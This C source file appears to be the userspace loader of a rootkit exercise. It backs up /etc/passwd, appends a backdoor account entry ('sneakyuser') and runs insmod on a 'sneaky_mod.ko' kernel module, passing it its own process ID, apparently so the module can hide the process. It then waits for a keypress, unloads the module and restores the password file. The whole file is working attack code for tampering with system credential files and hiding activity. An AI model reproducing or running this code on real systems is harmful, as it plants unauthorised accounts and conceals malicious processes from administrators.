#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

//copy file
int copyfile(){
  FILE* origin = fopen("/etc/passwd","r");//read origin file
  FILE* temp = fopen("/tmp/passwd","w");//write new file
  if(origin==NULL || temp==NULL){
    perror("cannot open the files\n");
    return EXIT_FAILURE;
  }
  int c =0;
  //read from the origin file
  while((c=fgetc(origin))!=EOF){
    //write to the new file
    fprintf(temp,"%c",(char)c);
  }
  if(fclose(origin)!=0){
    perror("cannot close the origin file\n");
    return EXIT_FAILURE;
  }
  if(fclose(temp)!= 0){
    perror("cannot close the new file\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

//add new username and password
int addfile(){
  FILE* f = fopen("/etc/passwd","a");//write from end to origin file
  if(f == NULL){
    perror("cannot open the file\n");
    return EXIT_FAILURE;
  }
  fprintf(f,"%s","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  if(fclose(f)!=0){
    perror("cannot close the file\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

//restore the origin file
int restore(){
  FILE* origin = fopen("/etc/passwd","w");//write origin file
  FILE* temp = fopen("/tmp/passwd","r");//read temp file
  if(origin==NULL || temp==NULL){
    perror("cannot open the files\n");
    return EXIT_FAILURE;
  }
  int c =0;
  //read from the temp file
  while((c=fgetc(temp))!=EOF){
    //write to the origin file
    fprintf(origin,"%c",(char)c);
  }
  if(fclose(origin)!=0){
    perror("cannot close the origin file\n");
    return EXIT_FAILURE;
  }
  if(fclose(temp)!= 0){
    perror("cannot close the new file\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

//sneaky process
int sneaky(int pid){
  pid_t cpid = 0;
  pid_t w = 0;
  int wstatus = 0;
  cpid = fork();
  if(cpid == -1){
    perror("fork\n");
    return EXIT_FAILURE;
  }
  //  printf("start to load sneaky kernel moudle\n");
  //child process
  if(cpid == 0){
    char send[50];//pass pid to module
    snprintf(send,sizeof(send),"mypid=%d",pid);
    //load the module
    char* argv[4];
    argv[0]="insmod";
    argv[1]="sneaky_mod.ko";
    argv[2]=send;
    argv[3]=NULL;
    if(execvp(argv[0],argv)==-1){
      perror("insmod\n");
      return EXIT_FAILURE;
    }
  }
  //parent process
  else{
    w = waitpid(cpid,&wstatus,0);
    if(w==-1){
      perror("waitpid\n");
      return EXIT_FAILURE;
    }
    //printf("load finish\n");
    //while loop to read from the keyboard
    //printf("wait for q\n");
    while(1){
      if(fgetc(stdin)==113){
	break;
      }
    }
    //printf("end of while\n");
  }
  return EXIT_SUCCESS;
}

//unload the sneaky mudule
int endsneaky(){
  pid_t cpid = 0;
  pid_t w = 0;
  int wstatus = 0;
  cpid = fork();
  if(cpid == -1){
    perror("fork\n");
    return EXIT_FAILURE;
  }
  //printf("start to unload sneaky kernel moudle\n");
  //child process
  if(cpid == 0){
    //unload the module
    char* argv[3];
    argv[0]="rmmod";
    argv[1]="sneaky_mod.ko";
    argv[2]=NULL;
    if(execvp(argv[0],argv)==-1){
      perror("rmmod\n");
      return EXIT_FAILURE;
    }
  }
  //parent process
  else{
    w = waitpid(cpid,&wstatus,0);
    if(w==-1){
      perror("waitpid\n");
      return EXIT_FAILURE;
    }
    //printf("unload finish\n");
  }
  return EXIT_SUCCESS;
}

int main(){
  //print its process ID
  int pid = getpid();
  printf("sneaky_process pid = %d\n",pid);
  //copy the files
  if(copyfile()==-1){
    perror("cannot copy the password\n");
    return EXIT_FAILURE;
  }
  //add new username and password
  if(addfile()==-1){
    perror("cannot add new username and password\n");
    return EXIT_FAILURE;
  }
  //sneaky part
  if(sneaky(pid)==-1){
    perror("fail in the sneaky process\n");
    restore(pid);//restore
    return EXIT_FAILURE;
  }
  //unload sneaky module
  if(endsneaky()==-1){
    perror("fail in the end of sneaky process\n");
    restore(pid);//restore
    return EXIT_FAILURE;
  }
  //restore the file
  if(restore(pid)==-1){
    perror("cannot resotre the content\n");
    return EXIT_FAILURE;
    }
  return EXIT_SUCCESS;
}

